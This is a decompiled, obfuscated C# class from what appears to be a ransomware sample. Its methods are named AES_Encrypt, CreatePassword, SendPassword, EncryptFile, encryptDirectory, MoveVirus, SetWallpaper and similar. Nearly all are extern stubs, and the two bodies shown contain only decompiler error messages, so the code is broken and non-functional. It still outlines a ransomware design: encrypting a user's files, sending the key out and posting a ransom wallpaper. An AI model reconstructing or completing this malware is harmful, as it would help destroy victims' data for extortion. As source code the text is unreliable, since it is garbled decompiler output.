using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Attachment;

public class Form1 : Form
{
	private string targetURL;

	private string userName;

	private string computerName;

	private string userDir;

	private string backgroundImageUrl;

	private IContainer components;

	protected override extern CreateParams CreateParams
	{
		[_42133226("5D08", "c0285c3e-f946-d24e-ff93-a5ca650eff6c")]
		get;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	[_42133226("0E08", "2a615068-3a5f-a6ba-19bb-0efe091c60c3")]
	public extern Form1();

	[_42133226("0008", "0dbe0fe3-996c-3ee9-f86f-5579fb8e0e4e")]
	public extern byte[] AES_Encrypt(byte[] byte_0, byte[] byte_1);

	[_42133226("0208", "3c81f37f-7ac4-0c68-81e1-0b75b79e472f")]
	public extern string CreatePassword(int int_0);

	[_42133226("5F0C08", "f4bc7f53-0f18-560a-21f2-6dd6ab32275a")]
	public extern void SendPassword(string string_0);

	[_42133226("0F3CDD", "a0a12031-b5ab-9ab7-cfcf-b902042116e2")]
	public void EncryptFile(string string_0, string string_1)
	{
		//Discarded unreachable code: IL_0006
		/*Error: ldloc 3 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	[_42133226("3E3CDD", "21db008b-bcee-7443-92a0-5b0e297c0fed")]
	public void encryptDirectory(string string_0, string string_1)
	{
		//Discarded unreachable code: IL_0006
		/*Error: ldloc 3 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	[_42133226("200DDD", "4acac679-10dd-09e8-bf86-8b4de3b41da1")]
	public extern void MoveVirus();

	[_42133226("3E0BDD", "2b576f1f-d9f7-bd63-6fe6-bfe899b600de")]
	public static extern bool CheckForInternetConnection();

	[_42133226("7327DD", "e52ee54c-7c90-c463-5752-0b84d3ae557c")]
	public extern void startAction();

	[_42133226("3F77DD", "1d698aef-2210-3670-0eeb-5ba9877a124e")]
	public extern void Directory_Settings_Sending(string string_0);

	[_42133226("3C21DD", "09831c79-b7c7-2a62-3df1-b8b4edcbe001")]
	public extern void messageCreator();

	[_42133226("702BDD", "d6b5de3d-b61a-7cd9-c857-9f22bddac9cf")]
	public extern void VoiceCreator();

	[_42133226("0F79DD", "acd2398a-f07c-1970-88c4-777609aa68d2")]
	public extern void SetWallpaper(string string_0);

	[_42133226("2271DD", "3c76b2c0-026f-7adf-30fb-0b84e9ce9c41")]
	protected override extern void Dispose(bool disposing);
}
